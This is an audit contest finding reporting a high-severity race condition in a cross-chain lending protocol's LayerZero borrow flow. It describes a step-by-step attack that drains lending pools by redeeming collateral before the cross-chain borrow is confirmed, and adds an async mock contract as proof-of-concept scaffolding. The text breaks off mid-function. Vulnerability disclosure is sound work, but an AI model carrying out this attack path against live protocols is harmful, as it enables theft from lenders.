Dandy Fiery Alligator

High

# [H-01] - Attacker can drain the cross chain lending pools by redeeming collateral before layerzero lending callback is confirmed

### Summary

The protocol is written in a way that assumes LayerZero calls are synchronous and that the state in `LendStorage.sol` will be synced across all chains at all times. However, this is not the case because LayerZero calls are asynchronous. 

The `CrossChainRouter::borrowCrossChain` checks the collateral of the borrower on Chain A and then submits a cross chain borrow request through LayerZero. The `payload.collateral` is set in the LayerZero message to be checked on Chain B in `CrossChainRouter::_handleBorrowCrossChainRequest`. 

The issue is that `CrossChainRouter::borrowCrossChain` does not have any functionality that restricts redemptions for a borrower while a cross chain borrow request is in flight. This allows any borrower to:

1.) Supply collateral on Chain A
2.) Request a cross chain borrow on Chain B
3.) Withdraw their collateral on Chain A
4.) Receive "borrowed" tokens on Chain B, even though their collateral has been withdrawn on Chain A

A sophisticated attacker could set up multiple versions of this attack path via custom smart contract(s) to drain the protocol of it's TVL across different chains and borrowing paths/tokens.

### Root Cause

The protocol assumes that the LayerZero calls are synchronous and does not lock redemptions for a borrower while cross chain borrow requests are in flight. The cross chain borrow request is only validated against `payload.collateral` in the LayerZero payload, which can be stale by the time it's executed. 

`CrossChainRouter::borrowCrossChain` does not set a lock. It only verifies the current collateral deposited and then sets the payload collateral value. It also does not set any sort of `borrowValuePending` that would prevent redemptions before the state is updated with the confirmed borrow amount.

https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L113-L154

`CrossChainRouter::_handleBorrowCrossChainRequest` only validates against `payload.collateral`, which will be stale by the time it arrives on Chain B.

https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L616-L625

### Internal Pre-conditions

There are no "weird" preconditions to this, just assumptions about the state of the protocol which should be expected. Namely, that Token B is supplied on Chain B and that there is enough to fulfill their borrow request. Presumably, an attacker would check this in advance.

1.) There must be enough of Token B for the attacker to borrow (they will check this) so that their borrow request succeeds

### External Pre-conditions

1.) LayerZero is functioning on both Chain A and Chain B and will deliver the message request to `CrossChainRouter` on Chain B

### Attack Path

1. An attacker supplies Token A on Chain A using the `CoreRouter::supply` function
2. The attacker requests a cross chain borrow for Token B on Chain B using the Token A supplied. They can calculate their maximum borrow amount using `LendStorage::getMaxBorrowAmount` on Chain A or use any amount less than it. Then call `CrossChainRouter::borrowCrossChain(amount, tokenA,  CHAIN_B_ID)`.
3. The attacker redeems their lTokens on Chain A to receive their original TokenA supply back while the LayerZero cross chain borrow request is in flight. They can calculate their `lToken` redemption amount using `LendStorage::totalInvestment(attacker, lTokenA)`. Then call `CoreRouter::redeem(lTokenBalance, payable(lTokenA))`

An attacker could chain these 3 steps into a custom smart contract to guarantee their success as a chain. It also guarantees that the redemption will complete before the LayerZero request is complete on Chain B and the successful callback updating the state is completed on Chain A. However, even manual execution will most likely complete before the LayerZero calls are processed.

4. `lzReceive` is called by the LayerZero infrastructure on the `CrossChainRouter` contract on Chain B and the "borrowed" tokens are sent to the attacker address on Chain B. The smart contract only verifies the collateral amount sent in the payload against the borrow amount, but the attacker has already withdrawn the collateral on chain A. 
5. Another LayerZero message is sent from Chain B to Chain A to confirm the borrow and update the state. (This step can actually revert and it doesn't matter since the attack is complete, but it does actually complete successfully).

Now, the attacker has their original supply back of TokenA on Chain A and they have their Token B borrow amount supplied to their address on Chain B. They have stolen the funds on Chain B since they do not have any supplied collateral in the protocol. 

An attacker could be well funded or utilize flash loans to repeat this across a variety of addresses and token combinations to drain all the funds from every chain in the protocol. 

### Impact

The protocol can be drained of the entirety of it's TVL across all chains, leaving it insolvent and lenders with a 100% loss. 

### PoC

The provided mock tests use `CrossChainRouterMock.sol` and `Deploy.s.sol` which provided a mock implementation of the protocol passing LayerZero messages between contracts. The issue with these is that it implements LayerZero messages atomically/synchronously, when in reality there is a gap between the sending of the message and execution. 

I have provided 2 slightly altered files to be used for this proof of concept called `CrossChainMockAsync.sol` and `DeployAsync.s.sol` which mock LayerZero by returning the `lzReceive` values. These values are then used to call `lzReceive` on the cross chain contract. Then, I provide a test that shows a proof of concept of the steps outlined in the Attack Path section.

Place `TestDrainCrossChain.t.sol` and `CrossChainMockAsync.sol` in a folder titled `poc` within `test`. Place `DeployAsync.s.sol` in `script`. 

Then in the terminal run `forge test --match-test test_cross_chain_drain -vvv`. You will see the outputted logs that show the Attacker's balances through the steps of the attack path.

`CrossChainMockAsync` :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {OptionsBuilder} from "@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/libs/OptionsBuilder.sol";
import {OApp, MessagingFee, Origin} from "@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/OApp.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {CoreRouter} from "../../src/LayerZero/CoreRouter.sol";

import "../../src/LayerZero/LendStorage.sol";
import "../../src/LToken.sol";
import "../../src/LErc20Delegator.sol";
import "../../src/LayerZero/interaces/LendtrollerInterfaceV2.sol";
import "../../src/LayerZero/interaces/LendInterface.sol";
import "../../src/LayerZero/interaces/UniswapAnchoredViewInterface.sol";

import "forge-std/console2.sol";

/**
 * @title CrossChainRouter
 * @notice Handles all cross-chain lending operations
 * @dev Works with LendStorage for state management and LayerZero for cross-chain messaging
 */
contract CrossChainMockAsync is Ownable, ExponentialNoError {
    using SafeERC20 for IERC20;
    using OptionsBuilder for bytes;

    // Storage contract reference
    LendStorage public immutable lendStorage;
    uint32 public immutable currentEid;

    // Add reference to paired mock contract
    CrossChainMockAsync public pairContract;

    address public lendtroller;
    address public priceOracle;
    address payable public coreRouter;
    uint256 public constant PROTOCOL_SEIZE_SHARE_MANTISSA = 2.8e16; // 2.8%

    //Struct for internal _send to avoid stack too deep
    struct SendParams {
        uint32 dstEid;
        uint256 amount;
        uint256 borrowIndex;
        uint256 collateral;
        address sender;
        address destlToken;
        address liquidator;
        address srcToken;
        ContractType ctype;
    }

    //Struct for returning lzReceive parameters to call in testing
    struct LZReceiveParams {
        Origin origin;
        //bytes32 guid;
        bytes payload;
        //address executor;
        //bytes extraData; 
    }

    // Struct for LayerZero payload
    struct LZPayload {
        uint256 amount;
        uint256 borrowIndex;
        uint256 collateral;
        address sender;
        address destlToken;
        address liquidator;
        address srcToken;
        uint8 contractType;
    }

    enum ContractType {
        BorrowCrossChain,
        ValidBorrowRequest,
        DestRepay,
        CrossChainLiquidationExecute,
        LiquidationSuccess,
        LiquidationFailure
    }

    // Events
    event CrossChainBorrow(address indexed borrower, address indexed destToken, uint256 amount, uint32 srcChainId);
    // Event emitted on successful liquidation
    event LiquidateBorrow(address liquidator, address lToken, address borrower, address lTokenCollateral);
    event LiquidationFailure(address liquidator, address lToken, address borrower, address lTokenCollateral);
    // Event emitted on successful repayment
    event RepaySuccess(address repayBorrowPayer, address lToken, uint256 repayBorrowAccountBorrows);
    event BorrowSuccess(address indexed borrower, address indexed token, uint256 accountBorrow);

    /**
     * @notice Constructor initializes the contract with required addresses
     * @param _lendStorage LendStorage contract address
     * @param _priceOracle PriceOracle contract address
     * @param _lendtroller Lendtroller contract address
     * @param _currentEid The current endpoint ID
     */
    constructor(
        address _lendStorage,
        address _priceOracle,
        address _lendtroller,
        address payable _coreRouter,
        uint32 _currentEid
    ) Ownable() {
        require(_lendStorage != address(0), "Invalid storage address");
        lendStorage = LendStorage(_lendStorage);
        priceOracle = _priceOracle;
        lendtroller = _lendtroller;
        coreRouter = _coreRouter;
        currentEid = _currentEid;
    }

    receive() external payable {}

    // Add function to set pair contract
    function setPairContract(address payable _pairContract) external {
        pairContract = CrossChainMockAsync(_pairContract);
    }

    /**
     * ============================================ ADMIN FUNCTIONS ============================================
     */
    function withdrawEth() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No ETH to withdraw");
        (bool success,) = msg.sender.call{value: balance}("");
        require(success, "ETH transfer failed");
    }

    /**
     * ============================================ USER FUNCTIONS ============================================
     */

    /**
     * @notice Initiates a cross-chain borrow. Initiated on the source chain (Chain A)
     * @param _amount Amount to borrow
     * @param _borrowToken Token to borrow on destination chain
     * @param _destEid Destination chain's layer zero endpoint id
     */
    function borrowCrossChain(uint256 _amount, address _borrowToken, uint32 _destEid) external payable returns (LZReceiveParams memory) {
        require(msg.sender != address(0), "Invalid sender");
        require(_amount != 0, "Zero borrow amount");
        require(address(this).balance > 0, "Out of money");

        // Get source lToken for collateral
        address _lToken = lendStorage.underlyingTolToken(_borrowToken);
        require(_lToken != address(0), "Unsupported source token");

        // Get the destination chain's version of the token
        address destLToken = lendStorage.underlyingToDestlToken(_borrowToken, _destEid);
        require(destLToken != address(0), "Unsupported destination token");

        // Accrue interest on source token (collateral token) on source chain
        LTokenInterface(_lToken).accrueInterest();

        // Add collateral tracking on source chain
        lendStorage.addUserSuppliedAsset(msg.sender, _lToken);

        if (!isMarketEntered(msg.sender, _lToken)) {
            enterMarkets(_lToken);
        }

        // Get current collateral amount for the LayerZero message
        // This will be used on dest chain to check if sufficient
        (, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(_lToken), 0, 0);

        // Send message to destination chain with verified sender
        // borrowIndex of 0 initially - will be set correctly on dest chain
        return _send(
            SendParams({
                dstEid: _destEid,
                amount: _amount,
                borrowIndex: 0, // Initial borrowIndex, will be set on dest chain
                collateral: collateral,
                sender: msg.sender,
                destlToken: destLToken,
                liquidator: address(0), // liquidator
                srcToken: _borrowToken,
                ctype: ContractType.BorrowCrossChain
            })
        );
    }

    function repayCrossChainBorrow(address _borrower, uint256 _amount, address _lToken, uint32 _srcEid) external {
        require(_amount > 0, "Amount must be greater than 0");
        require(_lToken != address(0), "Invalid lToken address");

        // Pass to internal function for processing
        repayCrossChainBorrowInternal(_borrower, msg.sender, _amount, _lToken, _srcEid);
    }

    /**
     * @notice Initiates a cross-chain liquidation. This is called on Chain B (where the debt exists)
     * @param borrower The address of the borrower to liquidate
     * @param repayAmount The amount of the borrowed asset to repay
     * @param srcEid The chain ID where the collateral exists (Chain A)
     * @param lTokenToSeize The collateral token the liquidator will seizes' address on the current chain
     * @param borrowedAsset The borrowed asset address on this chain (Chain B)
     */
    function liquidateCrossChain(
        address borrower,
        uint256 repayAmount,
        uint32 srcEid,
        address lTokenToSeize,
        address borrowedAsset
    ) external {
        LendStorage.LiquidationParams memory params = LendStorage.LiquidationParams({
            borrower: borrower,
            repayAmount: repayAmount,
            srcEid: srcEid,
            lTokenToSeize: lTokenToSeize, // Collateral lToken from the user's position to seize
            borrowedAsset: borrowedAsset,
            storedBorrowIndex: 0,
            borrowPrinciple: 0,
            borrowedlToken: address(0)
        });

        _validateAndPrepareLiquidation(params);
        _executeLiquidation(params);
    }

    /**
     * ============================================ INTERNAL FUNCTIONS ============================================
     */
    function _validateAndPrepareLiquidation(LendStorage.LiquidationParams memory params) private view {
        require(params.borrower != msg.sender, "Liquidator cannot be borrower");
        require(params.repayAmount > 0, "Repay amount cannot be zero");

        // Get the lToken for the borrowed asset on this chain
        params.borrowedlToken = lendStorage.underlyingTolToken(params.borrowedAsset);
        require(params.borrowedlToken != address(0), "Invalid borrowed asset");

        // Important: Use underlying token addresses consistently
        address borrowedUnderlying = lendStorage.lTokenToUnderlying(params.borrowedlToken);

        // Verify the borrow position exists and get details
        LendStorage.Borrow[] memory userCrossChainCollaterals =
            lendStorage.getCrossChainCollaterals(params.borrower, borrowedUnderlying);
        bool found = false;

        for (uint256 i = 0; i < userCrossChainCollaterals.length;) {
            if (userCrossChainCollaterals[i].srcEid == params.srcEid) {
                found = true;
                params.storedBorrowIndex = userCrossChainCollaterals[i].borrowIndex;
                params.borrowPrinciple = userCrossChainCollaterals[i].principle;
                break;
            }
            unchecked {
                ++i;
            }
        }
        require(found, "No matching borrow position");

        // Validate liquidation amount against close factor
        uint256 maxLiquidationAmount = lendStorage.getMaxLiquidationRepayAmount(
            params.borrower,
            params.borrowedlToken,
            false // cross-chain liquidation
        );
        require(params.repayAmount <= maxLiquidationAmount, "Exceeds max liquidation");
    }

    function _executeLiquidation(LendStorage.LiquidationParams memory params) private {
        // First part: Validate and prepare liquidation parameters
        uint256 maxLiquidation = _prepareLiquidationValues(params);

        require(params.repayAmount <= maxLiquidation, "Exceeds max liquidation");

        // Secon part: Validate collateral and execute liquidation
        _executeLiquidationCore(params);
    }

    function _prepareLiquidationValues(LendStorage.LiquidationParams memory params)
        private
        returns (uint256 maxLiquidation)
    {
        // Accrue interest
        LTokenInterface(params.borrowedlToken).accrueInterest();
        uint256 currentBorrowIndex = LTokenInterface(params.borrowedlToken).borrowIndex();

        // Calculate current borrow value with accrued interest
        uint256 currentBorrow = (params.borrowPrinciple * currentBorrowIndex) / params.storedBorrowIndex;

        // Verify repay amount is within limits
        maxLiquidation = mul_ScalarTruncate(
            Exp({mantissa: LendtrollerInterfaceV2(lendtroller).closeFactorMantissa()}), currentBorrow
        );

        return maxLiquidation;
    }

    function _executeLiquidationCore(LendStorage.LiquidationParams memory params) private {
        // Calculate seize tokens
        address borrowedlToken = lendStorage.underlyingTolToken(params.borrowedAsset);

        (uint256 amountSeizeError, uint256 seizeTokens) = LendtrollerInterfaceV2(lendtroller)
            .liquidateCalculateSeizeTokens(borrowedlToken, params.lTokenToSeize, params.repayAmount);

        require(amountSeizeError == 0, "Seize calculation failed");

        // Send message to Chain A to execute the seize
        _send(
            SendParams({
            dstEid: params.srcEid,
            amount: seizeTokens,
            borrowIndex: params.storedBorrowIndex,
            collateral: 0,
            sender: params.borrower,
            destlToken: lendStorage.crossChainLTokenMap(params.lTokenToSeize, params.srcEid), // Convert to Chain A version before sending
            liquidator: msg.sender,
            srcToken: params.borrowedAsset,
            ctype: ContractType.CrossChainLiquidationExecute
            })
        );
    }

    function _updateBorrowPositionForLiquidation(
        LendStorage.LiquidationParams memory params,
        uint256 currentBorrowIndex
    ) private {
        LendStorage.Borrow[] memory userBorrows = lendStorage.getCrossChainCollaterals(msg.sender, params.borrowedAsset);

        for (uint256 i = 0; i < userBorrows.length;) {
            if (userBorrows[i].srcEid == params.srcEid) {
                // Reduce the borrow amount
                uint256 borrowAmount = (userBorrows[i].principle * currentBorrowIndex) / userBorrows[i].borrowIndex;
                userBorrows[i].principle = borrowAmount - params.repayAmount;
                userBorrows[i].borrowIndex = currentBorrowIndex;
                lendStorage.updateCrossChainCollateral(msg.sender, params.borrowedAsset, i, userBorrows[i]);
                break;
            }
            unchecked {
                ++i;
            }
        }
    }

    /**
     * @notice Handles the final liquidation execution on Chain A (collateral chain)
     * @param payload The decoded message payload
     */
    function _handleLiquidationExecute(LZPayload memory payload, uint32 srcEid) private returns (LZReceiveParams memory) {
        // Execute the seize of collateral
        uint256 protocolSeizeShare = mul_(payload.amount, Exp({mantissa: lendStorage.PROTOCOL_SEIZE_SHARE_MANTISSA()}));

        require(protocolSeizeShare < payload.amount, "Invalid protocol share");

        uint256 liquidatorShare = payload.amount - protocolSeizeShare;

        // Update protocol rewards
        lendStorage.updateProtocolReward(
            payload.destlToken, lendStorage.protocolReward(payload.destlToken) + protocolSeizeShare
        );

        // Distribute LEND rewards
        lendStorage.distributeSupplierLend(payload.destlToken, payload.sender); // borrower
        lendStorage.distributeSupplierLend(payload.destlToken, payload.liquidator); // liquidator

        // Update total investment
        lendStorage.updateTotalInvestment(
            payload.sender,
            payload.destlToken,
            lendStorage.totalInvestment(payload.sender, payload.destlToken) - payload.amount
        );
        lendStorage.updateTotalInvestment(
            payload.liquidator,
            payload.destlToken,
            lendStorage.totalInvestment(payload.liquidator, payload.destlToken) + liquidatorShare
        );

        if (lendStorage.totalInvestment(payload.sender, payload.destlToken) == 0) {
            lendStorage.removeUserSuppliedAsset(payload.sender, payload.destlToken);
        }

        emit LiquidateBorrow(
            payload.liquidator, // liquidator
            payload.srcToken, // borrowed token
            payload.sender, // borrower
            payload.destlToken // collateral token
        );

        return _send(
            SendParams({
            dstEid: srcEid,
            amount: payload.amount,
            borrowIndex: 0,
            collateral: 0,
            sender: payload.sender,
            destlToken: payload.destlToken,
            liquidator: payload.liquidator,
            srcToken: payload.srcToken,
            ctype: ContractType.LiquidationSuccess
            })
        );
    }

    function repayCrossChainBorrowInternal(
        address borrower,
        address repayer,
        uint256 _amount,
        address _lToken,
        uint32 _srcEid
    ) internal {
        address _token = lendStorage.lTokenToUnderlying(_lToken);
        LTokenInterface(_lToken).accrueInterest();

        // Get borrow details and validate
        (uint256 borrowedAmount, uint256 index, LendStorage.Borrow memory borrowPosition) =
            _getBorrowDetails(borrower, _token, _lToken, _srcEid);

        // Calculate and validate repay amount
        uint256 repayAmountFinal = _amount == type(uint256).max ? borrowedAmount : _amount;
        require(repayAmountFinal <= borrowedAmount, "Repay amount exceeds borrow");

        // Handle token transfers and repayment
        _handleRepayment(borrower, repayer, _lToken, repayAmountFinal);

        // Update state
        _updateRepaymentState(
            borrower, _token, _lToken, borrowPosition, repayAmountFinal, borrowedAmount, index, _srcEid
        );

        emit RepaySuccess(borrower, _token, repayAmountFinal);
    }

    function _getBorrowDetails(address borrower, address _token, address _lToken, uint32 _srcEid)
        private
        view
        returns (uint256 borrowedAmount, uint256 index, LendStorage.Borrow memory borrowPosition)
    {
        LendStorage.Borrow[] memory userCrossChainCollaterals = lendStorage.getCrossChainCollaterals(borrower, _token);
        bool found;

        for (uint256 i = 0; i < userCrossChainCollaterals.length;) {
            if (userCrossChainCollaterals[i].srcEid == _srcEid) {
                borrowPosition = userCrossChainCollaterals[i];
                index = i;
                found = true;
                borrowedAmount = (borrowPosition.principle * uint256(LTokenInterface(_lToken).borrowIndex()))
                    / uint256(borrowPosition.borrowIndex);
                break;
            }
            unchecked {
                ++i;
            }
        }
        require(found, "No matching borrow position found");
        return (borrowedAmount, index, borrowPosition);
    }

    /// @dev Repayer must've approved the CoreRouter to spend the tokens
    function _handleRepayment(address _borrower, address repayer, address _lToken, uint256 repayAmountFinal) private {
        // Execute the repayment
        CoreRouter(coreRouter).repayCrossChainLiquidation(_borrower, repayer, repayAmountFinal, _lToken);

        // @audit - Need to send liquidation rewards back to the liquidator
    }

    /**
     * Checked on chain A (source chain), as that's where the collateral exists.
     */
    function _checkLiquidationValid(LZPayload memory payload) private view returns (bool) {
        (uint256 borrowed, uint256 collateral) = lendStorage.getHypotheticalAccountLiquidityCollateral(
            payload.sender, LToken(payable(payload.destlToken)), 0, payload.amount
        );
        return borrowed > collateral;
    }

    function _handleLiquidationSuccess(LZPayload memory payload) private {
        // Find the borrow position on Chain B to get the correct srcEid
        address underlying = lendStorage.lTokenToUnderlying(payload.destlToken);

        // Find the specific collateral record
        (bool found, uint256 index) = lendStorage.findCrossChainCollateral(
            payload.sender,
            underlying,
            currentEid, // srcEid is current chain
            0, // We don't know destEid yet, but we can match on other fields
            payload.destlToken,
            payload.srcToken
        );

        require(found, "Borrow position not found");

        LendStorage.Borrow[] memory userCollaterals = lendStorage.getCrossChainCollaterals(payload.sender, underlying);
        uint32 srcEid = uint32(userCollaterals[index].srcEid);

        // Now that we know the borrow position and srcEid, we can repay the borrow using the escrowed tokens
        // repayCrossChainBorrowInternal will handle updating state and distributing rewards.
        repayCrossChainBorrowInternal(
            payload.sender, // The borrower
            payload.liquidator, // The liquidator (repayer)
            payload.amount, // Amount to repay
            payload.destlToken, // lToken representing the borrowed asset on this chain
            srcEid // The chain where the collateral (and borrow reference) is tracked
        );
    }

    function _handleLiquidationFailure(LZPayload memory payload) private {
        // The tokens are escrowed in this contract, return them back to the liquidator
        // These tokens are the underlying tokens of payload.destlToken
        address underlying = lendStorage.lTokenToUnderlying(payload.destlToken);

        // Refund the liquidator
        IERC20(underlying).safeTransfer(payload.liquidator, payload.amount);

        emit LiquidationFailure(payload.liquidator, payload.destlToken, payload.sender, underlying);
    }

    /**
     * Triggered on Chain A.
     * Sends a message back to chain B to handle the liquidation failure case.
     */
    function _sendLiquidationFailure(LZPayload memory payload, uint32 srcEid) private returns(LZReceiveParams memory) {
        return _send(
            SendParams({
            dstEid: srcEid,
            amount: payload.amount,
            borrowIndex: 0,
            collateral: 0,
            sender: payload.sender,
            destlToken: payload.destlToken,
            liquidator: payload.liquidator,
            srcToken: payload.srcToken,
            ctype: ContractType.LiquidationFailure
            })
        );
    }

    function _updateRepaymentState(
        address borrower,
        address _token,
        address _lToken,
        LendStorage.Borrow memory borrowPosition,
        uint256 repayAmountFinal,
        uint256 borrowedAmount,
        uint256 index,
        uint32 _srcEid
    ) private {
        uint256 currentBorrowIndex = LTokenInterface(_lToken).borrowIndex();
        LendStorage.Borrow[] memory userCrossChainCollaterals = lendStorage.getCrossChainCollaterals(borrower, _token);

        if (repayAmountFinal == borrowedAmount) {
            lendStorage.removeCrossChainCollateral(borrower, _token, index);
            if (userCrossChainCollaterals.length == 1) {
                lendStorage.removeUserBorrowedAsset(borrower, _lToken);
            }
        } else {
            userCrossChainCollaterals[index].principle = borrowedAmount - repayAmountFinal;
            userCrossChainCollaterals[index].borrowIndex = currentBorrowIndex;
            lendStorage.updateCrossChainCollateral(borrower, _token, index, userCrossChainCollaterals[index]);
        }

        lendStorage.distributeBorrowerLend(_lToken, borrower);

        _send(
            SendParams({
            dstEid: _srcEid,
            amount: repayAmountFinal,
            borrowIndex: currentBorrowIndex,
            collateral: 0,
            sender: borrower,
            destlToken: _lToken,
            liquidator: _token,
            srcToken: borrowPosition.srcToken,
            ctype: ContractType.DestRepay
            })
        );
    }

    function _handleDestRepayMessage(LZPayload memory payload, uint32 srcEid) private {
        // Find specific borrow using the new helper
        (bool found, uint256 index) =
            lendStorage.findCrossChainBorrow(payload.sender, payload.srcToken, srcEid, currentEid, payload.destlToken);

        require(found, "No matching borrow found");

        // Calculate current borrow with interest
        LendStorage.Borrow[] memory userBorrows = lendStorage.getCrossChainBorrows(payload.sender, payload.srcToken);
        uint256 currentBorrow = (userBorrows[index].principle * payload.borrowIndex) / userBorrows[index].borrowIndex;

        if (payload.amount >= currentBorrow) {
            // Full repayment
            lendStorage.removeCrossChainBorrow(payload.sender, payload.srcToken, index);
            if (userBorrows.length == 1) {
                lendStorage.removeUserBorrowedAsset(payload.sender, lendStorage.underlyingTolToken(payload.srcToken));
            }
        } else {
            // Partial repayment - update remaining borrow
            userBorrows[index].principle = currentBorrow - payload.amount;
            userBorrows[index].borrowIndex = payload.borrowIndex;

            lendStorage.updateCrossChainBorrow(payload.sender, payload.srcToken, index, userBorrows[index]);
        }

        // Distribute LEND rewards on source chain
        lendStorage.distributeBorrowerLend(lendStorage.underlyingTolToken(payload.srcToken), payload.sender);

        emit RepaySuccess(payload.sender, payload.srcToken, payload.amount);
    }

    /**
     * @notice Handles the borrow request on the destination chain. Received on Chain B
     * @param payload LayerZero payload containing borrow details
     * @param srcEid Source chain ID where collateral exists
     */
    function _handleBorrowCrossChainRequest(LZPayload memory payload, uint32 srcEid) private returns (LZReceiveParams memory) {
        // Accrue interest on borrowed token on destination chain
        LTokenInterface(payload.destlToken).accrueInterest();

        // Get current borrow index from destination lToken
        uint256 currentBorrowIndex = LTokenInterface(payload.destlToken).borrowIndex();

        // Important: Use the underlying token address
        address destUnderlying = lendStorage.lTokenToUnderlying(payload.destlToken);

        // Check if user has any existing borrows on this chain
        bool found = false;
        uint256 index;

        LendStorage.Borrow[] memory userCrossChainCollaterals =
            lendStorage.getCrossChainCollaterals(payload.sender, destUnderlying);

        for (uint256 i = 0; i < userCrossChainCollaterals.length;) {
            if (
                userCrossChainCollaterals[i].srcEid == srcEid
                    && userCrossChainCollaterals[i].srcToken == payload.srcToken
            ) {
                index = i;
                found = true;
                break;
            }
            unchecked {
                ++i;
            }
        }

        // Check if user has sufficient collateral for the borrow
        (uint256 totalBorrowed,) = lendStorage.getHypotheticalAccountLiquidityCollateral(
            payload.sender, LToken(payable(payload.destlToken)), 0, payload.amount
        );

        // Verify the collateral from source chain is sufficient for total borrowed amount
        require(payload.collateral >= totalBorrowed, "Insufficient collateral");

        // Execute the borrow on destination chain
        CoreRouter(coreRouter).borrowForCrossChain(payload.sender, payload.amount, payload.destlToken, destUnderlying);

        // Update or create collateral record on destination chain
        if (found) {
            uint256 newPrincipleWithAmount = (userCrossChainCollaterals[index].principle * currentBorrowIndex)
                / userCrossChainCollaterals[index].borrowIndex;

            userCrossChainCollaterals[index].principle = newPrincipleWithAmount + payload.amount;
            userCrossChainCollaterals[index].borrowIndex = currentBorrowIndex;

            lendStorage.updateCrossChainCollateral(
                payload.sender, destUnderlying, index, userCrossChainCollaterals[index]
            );
        } else {
            lendStorage.addCrossChainCollateral(
                payload.sender,
                destUnderlying,
                LendStorage.Borrow({
                    srcEid: srcEid,
                    destEid: currentEid,
                    principle: payload.amount,
                    borrowIndex: currentBorrowIndex,
                    borrowedlToken: payload.destlToken,
                    srcToken: payload.srcToken
                })
            );
        }

        // Track borrowed asset
        lendStorage.addUserBorrowedAsset(payload.sender, payload.destlToken);

        // Distribute LEND rewards on destination chain
        lendStorage.distributeBorrowerLend(payload.destlToken, payload.sender);

        // Send confirmation back to source chain with updated borrow details
        return _send( 
            SendParams({
            dstEid: srcEid,
            amount: payload.amount,
            borrowIndex: currentBorrowIndex,
            collateral: payload.collateral,
            sender: payload.sender,
            destlToken: payload.destlToken,
            liquidator: payload.liquidator,
            srcToken: payload.srcToken,
            ctype: ContractType.ValidBorrowRequest
        })
        );
    }

    /**
     * @notice Enters markets in the lendtroller
     */
    function enterMarkets(address _lToken) internal {
        address[] memory lTokens = new address[](1);
        lTokens[0] = _lToken;
        LendtrollerInterfaceV2(lendtroller).enterMarkets(lTokens);
    }

    /**
     * @notice Checks if a market is entered
     */
    function isMarketEntered(address user, address asset) internal view returns (bool) {
        address[] memory suppliedAssets = lendStorage.getUserSuppliedAssets(user);
        for (uint256 i = 0; i < suppliedAssets.length;) {
            if (suppliedAssets[i] == asset) return true;
            unchecked {
                ++i;
            }
        }
        return false;
    }

    /**
     * @notice Approves tokens for spending
     */
    function _approveToken(address _token, address _approvalAddress, uint256 _amount) internal {
        uint256 currentAllowance = IERC20(_token).allowance(address(this), _approvalAddress);
        if (currentAllowance < _amount) {
            if (currentAllowance > 0) {
                IERC20(_token).safeApprove(_approvalAddress, 0);
            }
            IERC20(_token).safeApprove(_approvalAddress, _amount);
        }
    }

    /**
     * @notice Handles the valid borrow request on the source chain. Received on the source chain (Chain A)
     * @param payload LayerZero payload
     * @param srcEid Source chain ID
     */
    function _handleValidBorrowRequest(LZPayload memory payload, uint32 srcEid) private {
        // Find the specific borrow record using the new helper
        (bool found, uint256 index) =
            lendStorage.findCrossChainBorrow(payload.sender, payload.srcToken, srcEid, currentEid, payload.destlToken);

        if (found) {
            // Update existing borrow
            LendStorage.Borrow[] memory userBorrows = lendStorage.getCrossChainBorrows(payload.sender, payload.srcToken);
            userBorrows[index].principle = userBorrows[index].principle + payload.amount;
            userBorrows[index].borrowIndex = payload.borrowIndex;

            // Update in storage
            lendStorage.updateCrossChainBorrow(payload.sender, payload.srcToken, index, userBorrows[index]);
        } else {
            // Add new borrow record
            lendStorage.addCrossChainBorrow(
                payload.sender,
                payload.srcToken,
                LendStorage.Borrow(
                    srcEid, currentEid, payload.amount, payload.borrowIndex, payload.destlToken, payload.srcToken
                )
            );
        }

        lendStorage.addUserBorrowedAsset(payload.sender, lendStorage.underlyingTolToken(payload.srcToken));

        // Emit BorrowSuccess event
        emit BorrowSuccess(payload.sender, payload.srcToken, payload.amount);
    }

    /**
     * @notice Sends LayerZero message
     */
    function _send(
        SendParams memory params
    ) internal returns (LZReceiveParams memory) {
        bytes memory payload =
            abi.encode(params.amount, params.borrowIndex, params.collateral, params.sender, params.destlToken, params.liquidator, params.srcToken, params.ctype);

        LZReceiveParams memory lzReceiveParams =_lzSend(
            params.dstEid,
            payload,
            OptionsBuilder.newOptions().addExecutorLzReceiveOption(650000, 0),
            MessagingFee(address(this).balance, 0),
            payable(address(this))
        );

        return lzReceiveParams;
    }

    /**
     * @dev Internal function to handle incoming Ping messages.
     * @param _origin The origin data of the message.
     * @param _payload The payload of the message.
     */
    function _lzReceive(
        Origin calldata _origin,
        bytes32, /*_guid*/
        bytes calldata _payload,
        address, /*_executor*/
        bytes calldata /*_extraData*/
    ) public returns (LZReceiveParams memory) {
        LZPayload memory payload;

        // Decode individual fields from payload
        (
            payload.amount,
            payload.borrowIndex,
            payload.collateral,
            payload.sender,
            payload.destlToken,
            payload.liquidator,
            payload.srcToken,
            payload.contractType
        ) = abi.decode(_payload, (uint256, uint256, uint256, address, address, address, address, uint8));

        uint32 srcEid = _origin.srcEid;
        ContractType ctype = ContractType(payload.contractType);
        // Handle different message types
        if (ctype == ContractType.BorrowCrossChain) {
           return _handleBorrowCrossChainRequest(payload, srcEid); //returns params
        } else if (ctype == ContractType.ValidBorrowRequest) {
            _handleValidBorrowRequest(payload, srcEid); //does not return params
        } else if (ctype == ContractType.DestRepay) {
            _handleDestRepayMessage(payload, srcEid); //does not return params
        } else if (ctype == ContractType.CrossChainLiquidationExecute) {
            if (_checkLiquidationValid(payload)) {
                return _handleLiquidationExecute(payload, srcEid); //returns params
            } else {
                return _sendLiquidationFailure(payload, srcEid); //returns params
            }
        } else if (ctype == ContractType.LiquidationSuccess) {
            _handleLiquidationSuccess(payload); //does not return params
        } else if (ctype == ContractType.LiquidationFailure) {
            _handleLiquidationFailure(payload); //does not return params
        } else {
            revert("Invalid contract type");
        }
    }

    // Mock _lzSend by returning lzReceive parameters to execute async
    function _lzSend(
        uint32 _dstChainId,
        bytes memory _payload,
        bytes memory, // options
